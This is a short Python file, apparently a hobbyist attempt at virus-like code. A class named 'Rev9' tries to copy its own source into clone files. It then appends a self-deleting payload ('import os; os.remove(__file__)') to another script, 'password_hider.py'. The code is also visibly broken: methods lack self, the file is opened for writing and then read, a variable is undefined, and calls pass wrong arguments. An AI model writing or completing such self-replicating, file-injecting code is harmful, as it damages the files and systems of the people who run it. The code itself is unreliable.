class Rev9:
    def __self__():
        pass
        
    def create_clone(clone_num):
        file_to_read = open(__file__.format(clone_num),'w')
        text = file.read()

        file_to_write = open('Rev-9(copy){}'.format(__self__.clone_num))
        file_to_write.write(text)
        file_to_write.close()

    def speak(text):
        print(text)

    def inject_program(code,file_name):
        file = open(file_name,'a')
        file.write(code)
        file.close()

Rev9().create_clone()
Rev9().speak()
Rev9().inject_program('import os\nos.remove(__file__)','password_hider.py')
    
        
        

    
        
        
    
